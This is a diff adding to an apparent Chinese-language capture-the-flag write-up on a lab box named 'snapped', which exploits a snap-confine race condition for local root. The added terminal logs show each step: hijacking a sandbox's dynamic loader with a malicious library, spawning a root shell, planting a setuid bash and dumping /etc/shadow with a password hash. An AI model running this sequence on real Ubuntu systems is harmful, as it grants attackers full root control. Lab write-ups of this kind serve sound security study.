@@ -472,9 +472,8 @@ Modify: 2026-04-14 05:10:27.600032874 -0400
 Change: 2026-04-14 05:10:27.600032874 -0400
  Birth: 2026-04-14 05:10:27.565032872 -0400
 jonathan@snapped:/tmp$ echo $$
-
+3715
 jonathan@snapped:/tmp$ while test -d ./.snap; do touch ./; sleep 1; done //现在要保持/tmp活跃，同时摒弃.snap陈旧观念
-jonathan@snapped:/tmp$
 
 //保持终端1运行，不要关闭它。
 //在默认的 Ubuntu 24.04 系统上，这需要 30 天时间。但是，可以通过修改脚本，在几分钟内模拟完成此过程。
@@ -490,7 +489,144 @@ mkdir .snap                    # now attacker-owned
 mkdir -p .snap/usr/lib/x86_64-linux-gnu.exchange
 ```
 #### 我们.exchange用真实库目录中的所有库的副本填充，再加上我们的恶意载荷。
+#### 在第二个terminal
+```
+jonathan@snapped:~$ cd /proc/3715/cwd
+jonathan@snapped:/proc/3715/cwd$ ls -al
+total 12
+drwxrwxrwt  4 root root 4096 Apr 15 03:07 .
+drwxr-xr-x 21 root root  540 Apr 15 03:05 ..
+drwxr-xr-x  4 root root 4096 Apr 15 03:05 .snap
+drwxrwxrwt  2 root root 4096 Apr 15 02:52 .X11-unix
+jonathan@snapped:/proc/3715/cwd$ ls -al
+total 4
+drwxrwxrwt  2 root root 4096 Apr 15 03:09 .
+drwxr-xr-x 21 root root  540 Apr 15 03:05 ..
+```
+```
+jonathan@snapped:/proc/3260/cwd$ ls -la
+total 4
+drwxrwxrwt  2 root root 4096 Apr 15 08:08 .
+drwxr-xr-x 21 root root  540 Apr 15 08:04 ..
+jonathan@snapped:/proc/3260/cwd$ mkdir -p .snap/usr/lib/x86_64-linux-gnu.exchange
+jonathan@snapped:/proc/3260/cwd$ ls -la
+total 8
+drwxrwxrwt  3 root     root     4096 Apr 15 08:09 .
+drwxr-xr-x 21 root     root      540 Apr 15 08:04 ..
+drwxrwxr-x  3 jonathan jonathan 4096 Apr 15 08:09 .snap
+jonathan@snapped:/proc/3260/cwd$ systemd-run --user --scope --unit=snap.d$(date +%s) /bin/bash -c \
+  "env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine \
+  --base snapd snap.firefox.hook.configure /nonexistent; exit"
+Running as unit: snap.d1776255002.scope; invocation ID: adbde2af581f402ea085e2bf395021f4
+cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_swHqfq//dev: No such file or directory
+
+```
+```
+
+jonathan@snapped:/proc/3715/cwd$
+jonathan@snapped:/proc/3715/cwd$ cd ~
+//预期的错误，为了保留/tmp其下的目录
+jonathan@snapped:~$ systemd-run --user --scope --unit=snap.d$(date +%s) /bin/bash -c \
+> "env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine \
+> --base snapd snap.firefox.hook.configure /nonexistent; exit"
+Running as unit: snap.d1776237238.scope; invocation ID: 303209263a1c4e738ebdd3e4c8ee7375
+cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_mSumBN//dev: No such file or directory
+
+jonathan@snapped:/proc/3566/cwd$ systemd-run --user --scope --unit=snap.d$(date +%s) /bin/bash -c "env -i SNAP_InsTANCE_NAME=firefox /usr/lib/snapd/snap-confine \                                                          
+--base snapd snap.firefox.hook.configure /nonexistent; exit"
+Running as unit: snap.d1776238729.scope; invocation ID: 7dc9beb498834a09840c866c2a9ffa2f
+SNAP_INSTANCE_NAME is not set
+jonathan@snapped:/proc/3566/cwd$ ls -al
+total 4
+drwxrwxrwt  2 root root 4096 Apr 15 03:38 .
+drwxr-xr-x 21 root root  540 Apr 15 03:34 ..
+
+jonathan@snapped:/proc/3566/cwd$ ~/firefox_2404 ~/librootshell.so
+[*] CVE-2026-3888-firefox 24.04 helper
+[*] Original research by Qualys (https://www.qualys.com)
+[*] CWD: /proc/3566/cwd
+[*] Setting up .snap and .exchange directory...
+[*] Exchange dir ready: 285 entries in .snap/usr/lib/x86_64-linux-gnu.exchange
+[*] Starting race against snap-confine...
+[*] Reading snap-confine output (PID 4241)...
+DEBUG: -- snap startup {"stage":"snap-confine enter", "time":"1776238822.629405"}
+DEBUG: umask reset, old umask was   02
+DEBUG: security tag: snap.firefox.hook.configure
+<SNIP>
+
+
+
+```
 #### The Race Window 竞赛窗口
+#### 第三个terminal
+```
+jonathan@snapped:/proc/3260/cwd$ ls -al
+total 20
+drwxrwxrwt  4 root     root     4096 Apr 15 08:10 .
+drwxr-xr-x 21 root     root      540 Apr 15 08:04 ..
+-rw-rw-r--  1 jonathan jonathan   30 Apr 15 08:10 race_perms.txt
+-rw-rw-r--  1 jonathan jonathan    5 Apr 15 08:10 race_pid.txt
+drwxrwxr-x  4 jonathan jonathan 4096 Apr 15 08:10 .snap
+drwxr-xr-x  2 root     root     4096 Apr 15 08:10 .X11-unix
+jonathan@snapped:/proc/3260/cwd$ cat race_perms.txt
+/bin/sh: 1: stat-c: not found
+jonathan@snapped:/proc/3260/cwd$ cat race_pid.txt
+4178
+jonathan@snapped:/proc/3260/cwd$ cat race_perms.txt
+/bin/sh: 1: stat-c: not found
+
+jonathan@snapped:~$ PID=$(cat /proc/3260/cwd/race_pid.txt)
+jonathan@snapped:~$ echo "$PID"
+4178
+jonathan@snapped:~$ cd /proc/$PID/root
+jonathan@snapped:/proc/4178/root$ stat -c '%U:%G %a' usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+jonathan:jonathan 755
+
+jonathan@snapped:/proc/4178/root$ cp /usr/bin/busybox ./tmp/sh
+jonathan@snapped:/proc/4178/root$ cat ~/librootshell.so > ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+
+//进入
+jonathan@snapped:/proc/4178/root$ env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine  --base core22 snap.firefox.hook.configure /usr/lib/snapd/snap-confine
+
+
+BusyBox v1.36.1 (Ubuntu 1:1.36.1-6ubuntu3.1) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+/ # id
+uid=0(root) gid=1000(jonathan) groups=1000(jonathan)
+/ # cp /bin/bash /var/snap/firefox/common/bash
+/ # chmod 04755 /var/snap/firefox/common/bash
+/ # exit
+
+jonathan@snapped:~$ /var/snap/firefox/common/bash -p
+bash-5.1# id
+uid=1000(jonathan) gid=1000(jonathan) euid=0(root) groups=1000(jonathan)
+bash-5.1# cat /etc/shadow
+root:$y$j9T$zId2KahOEss4vtaXcd42M/$IRbgHZj15ttgnrapjB9mPH2A/07Ymt.78sOmUaY.5FB:20531:0:99999:7:::
+daemon:*:19962:0:99999:7:::
+<SNIP>
+bash-5.1# cat /root/root.txt
+```
+| 字段   | 值                                                                           | 含义               |
+| ---- | --------------------------------------------------------------------------- | ---------------- |
+| 密码哈希 | `$y$j9T$zId2KahOEss4vtaXcd42M/$IRbgHZj15ttgnrapjB9mPH2A/07Ymt.78sOmUaY.5FB` | 加密后的密码           |
+| 最后修改 | `20531`                                                                     | 距 1970-01-01 的天数 |
+| 最小天数 | `0`                                                                         | 可立即修改            |
+| 最大天数 | `99999`                                                                     | 基本不过期            |
+| 警告天数 | `7`                                                                         | 提前7天提醒           |
+_____________________________
+#### 失败的样子
+```
+jonathan@snapped:/proc/3566/cwd$ cd /proc/$PID/root
+jonathan@snapped:/proc/4241/root$ stat -c '%U:%G %a' usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+root:root 755
+jonathan@snapped:/proc/4241/root$ cd ~
+jonathan@snapped:~$ cp /usr/bin/busybox ./tmp/sh
+cp: cannot create regular file './tmp/sh': No such file or directory
+jonathan@snapped:~$ cd /proc/3566/cwd
+jonathan@snapped:/proc/3566/cwd$ cp /usr/bin/busybox ./tmp/sh
+cp: cannot create regular file './tmp/sh': No such file or directory
+```
 ```
 竞争窗口存在于设置snap-confine后发出的两条特定调试消息之间：SNAPD_DEBUG=1
 触发点（步骤 1 完成）：
@@ -635,6 +771,7 @@ SO_RCVBUF=1在读取套接字上		接收端也没有缓冲。
 renameat2(RENAME_EXCHANGE)	原子交换，无中间不一致状态
 ```
 #### 结果就是，一旦前提条件满足，就会出现100%获胜的竞争条件，因为根本不存在竞争——攻击者将执行过程串行化。
+
 -----------------------------------------------------------------------------------------
 ### 官方的方式行不通 firefox.c的代码不对劲,而且超级看不懂官方的人话
 #### 对于 /usr/lib/x86_64-linux-gnu 目录的模拟序列是：
